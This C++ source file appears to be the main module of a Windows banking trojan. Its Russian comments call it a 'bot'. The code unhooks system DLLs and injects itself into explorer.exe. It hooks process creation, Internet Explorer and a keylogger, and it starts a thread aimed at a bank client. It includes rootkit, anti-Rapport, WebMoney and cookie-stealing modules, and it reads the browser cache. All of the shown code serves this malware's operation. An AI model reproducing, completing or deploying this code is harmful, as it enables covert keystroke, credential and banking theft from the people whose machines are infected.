#include <windows.h>

#include "GetApi.h"
#include "Memory.h"


#include "Strings.h"
#include "Utils.h"

#include "BotUtils.h"
#include "Rootkit.h"
#include "Inject.h"
#include "Unhook.h"


#include "Crypt.h"

#include "InternetExplorer.h"
#include "Java.h"
#include "KeyLogger.h"
#include "web_money_dll.h"

#include "ntdll.h"

#include "coocksol.h"
#include "AntiRapport.h"
#include "BBSCBank.h"


#include "md5.h"

#pragma comment(linker, "/ENTRY:MyMain" )


DWORD (WINAPI *pOldCreateProcessInternal)(
  __in         HANDLE hToken,                            
  __in_opt     LPCTSTR lpApplicationName,
  __inout_opt  LPTSTR lpCommandLine,
  __in_opt     LPSECURITY_ATTRIBUTES lpProcessAttributes,
  __in_opt     LPSECURITY_ATTRIBUTES lpThreadAttributes,
  __in         BOOL bInheritHandles,
  __in         DWORD dwCreationFlags,
  __in_opt     LPVOID lpEnvironment,
  __in_opt     LPCTSTR lpCurrentDirectory,
  __in         LPSTARTUPINFO lpStartupInfo,
  __out        LPPROCESS_INFORMATION lpProcessInformation,
  __in         DWORD unknown2                              
);

WCHAR TempFileName[ MAX_PATH ]; //темп файл для добавления в автозагрузку
WCHAR FileToDelete[ MAX_PATH ]; //путь для удаления первоначального файла бота

DWORD dwKillPid		 = 0; //пид для убийства процесса бота
DWORD dwFirst	     = 0; //запуск в первый раз
DWORD dwAlreadyRun   = 0; //если уже запущены
DWORD dwGrabberRun	 = 0; //отработал ли граббер
DWORD dwExplorerSelf = 0; //если инжект был в собственный эксплорер
DWORD dwWebMoneySelf = 0;

//DWORD dwExplorerPid  = 0; //пид эксплорера

//получаем пид эксплорера

bool WINAPI RetrieveStream(LPSTR lpszUrl)
{
	LPINTERNET_CACHE_ENTRY_INFO lpCacheEntry;
    DWORD dwEntrySize=0,dwStreamSize=0;
    HANDLE hStream;
    LPSTR lpszOut;

    pRetrieveUrlCacheEntryStreamA(lpszUrl,NULL, &dwEntrySize, TRUE, 0);
    lpCacheEntry = (LPINTERNET_CACHE_ENTRY_INFO)MemAlloc(dwEntrySize);
    if (!(hStream = pRetrieveUrlCacheEntryStreamA(lpszUrl,lpCacheEntry, 
        &dwEntrySize, TRUE, 0)))
    {
		DWORD err = pGetLastError();
        //ErrorOut(hX,pGetLastError(),"RetrieveUrlCacheEntryStream");
        return FALSE;
    }
    else
    {
        dwStreamSize = lpCacheEntry->dwSizeLow;
        lpszOut = (LPSTR)MemAlloc(dwStreamSize);
        if (!pReadUrlCacheEntryStream(hStream,0,LPVOID(lpszOut),&dwStreamSize,
            0))
        {
            //ErrorOut(hX,pGetLastError(),"ReadUrlCacheEntryStream");
            return FALSE;
        }
        else
        {
            lpszOut[dwStreamSize]='\0';
            //SetDlgItemText(hX,IDC_CacheDump,lpszOut);
            return TRUE;
        }
    }

    MemFree(lpCacheEntry);
    MemFree(lpszOut);
    
    if (!pUnlockUrlCacheEntryStream(hStream,0))
    {
        //ErrorOut(hX,pGetLastError(),"UnlockUrlCacheEntryStream");
        return FALSE;
    }
    else
        return TRUE;
}

void ExplorerMain()
{
	
	if ( !dwExplorerSelf )
	{
		UnhookDlls();
	}

   HookZwResumeThread();
//	HookZwQueryDirectoryFile();
	HookInternetExplorer();



	//HookCookie();
	//Delete_IECookies_Vista();
	
	//HookJava();
	 HookKeyLogger();
}

DWORD WINAPI ExplorerRoutine( LPVOID lpData )
{
	UnhookDlls();

	if ( dwExplorerSelf ) //если инжект был в свой эксплорер завершаемся
	{
		dwExplorerSelf = 0;

		if ( !InjectIntoExplorer( ExplorerRoutine ) )
		{
			ExplorerMain();
		}

		pExitProcess( 1 );
	}
	RunThreadBBS();
	ExplorerMain();
	
	return 0;
}



DWORD LiteCrypt( int Key, LPBYTE lpResult, DWORD dwSize )
{
    DWORD a = 0, b = 0;
    a = 0;
	
    while ( a < dwSize )
    {
        lpResult[ a ] ^= Key; 
        a++; 
    }

	return a;
}



int APIENTRY MyMain()
{
	//DeleteBrowsersCookies();
	//Delete_IECookies_Norm(true, true);
	//Delete_IECookies_Vista();
	//goto exit;
	//int res = RetrieveStream("https://www.bifit.com/demo/ru/client_su.html");//https://www.bifit.com/demo/ru/client_su.html");
	//DeleteBrowsersCookies();
	OutputDebugString("Start bot");
	UnhookDlls(); //снимаем хуки

// HookWebMoney();
//Sleep(100000);
		dwExplorerSelf = 1;

		if ( !JmpToExplorer( ExplorerRoutine ) )
		{
			dwExplorerSelf = 0;

			if ( !InjectIntoExplorer( ExplorerRoutine ) )
			{
			
			}
		}

exit:
	pExitProcess( 1 );

	return 0;
}

/*
DWORD WINAPI CreateProcessInternal(
  __in         HANDLE hToken,                            
  __in_opt     LPCTSTR lpApplicationName,
  __inout_opt  LPTSTR lpCommandLine,
  __in_opt     LPSECURITY_ATTRIBUTES lpProcessAttributes,
  __in_opt     LPSECURITY_ATTRIBUTES lpThreadAttributes,
  __in         BOOL bInheritHandles,
  __in         DWORD dwCreationFlags,
  __in_opt     LPVOID lpEnvironment,
  __in_opt     LPCTSTR lpCurrentDirectory,
  __in         LPSTARTUPINFO lpStartupInfo,
  __out        LPPROCESS_INFORMATION lpProcessInformation,
  __in         DWORD unknown2                               // always (?) NULL
)
{
	DWORD ret;
	ret= pOldCreateProcessInternal(hToken,                            
									lpApplicationName,
									lpCommandLine,
									 lpProcessAttributes,
									lpThreadAttributes,
									bInheritHandles,
									dwCreationFlags,
									lpEnvironment,
									lpCurrentDirectory,
									lpStartupInfo,
									lpProcessInformation,
									unknown2  
								);



	return ret;
};*/